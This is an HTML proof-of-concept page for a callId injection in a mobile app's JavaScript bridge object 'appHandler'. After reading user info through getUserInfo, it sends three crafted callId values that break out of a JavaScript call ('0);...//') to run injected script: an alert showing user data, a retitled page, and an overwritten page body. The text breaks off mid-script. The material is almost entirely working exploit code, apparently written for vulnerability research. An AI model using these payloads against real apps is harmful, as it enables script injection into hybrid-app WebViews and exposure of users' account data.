<h3 style="color:#c9a96e">JSBridge callId Injection PoC</h3>
<div id="log"></div>
<script>
function L(s,c){document.getElementById('log').innerHTML+='<div class="'+(c||'')+'">'+s+'</div>'}

if(typeof appHandler==='undefined'){
  L('NO BRIDGE','err');
}else{
  L('bridge: YES','ok');
  var u=appHandler.getUserInfo();
  L('getUserInfo: "'+u+'"','ok');

  // Test 1: alert (proven to work)
  L('sending test1 (alert)...','info');
  appHandler.appMonitorScript('getExpFlag',
    "0);alert('user='+appHandler.getUserInfo());//",
    '{"expKey":"a"}');

  // Test 2: document.title (very simple DOM change)
  setTimeout(function(){
    L('sending test2 (title)...','info');
    appHandler.appMonitorScript('getExpFlag',
      "0);document.title='PWNED_BY_CALLID';//",
      '{"expKey":"b"}');

  // Test 3: background color change (no HTML, no innerHTML)
  setTimeout(function(){
    L('sending test3 (bgcolor)...','info');
    appHandler.appMonitorScript('getExpFlag',
      "0);document.body.style.background='#cc0000';document.body.style.color='#fff';document.body.innerHTML='CALLID INJECTION SUCCESS<br>getUserInfo='+appHandler.getUserInfo();//",
      '{"expKey":"c"}');
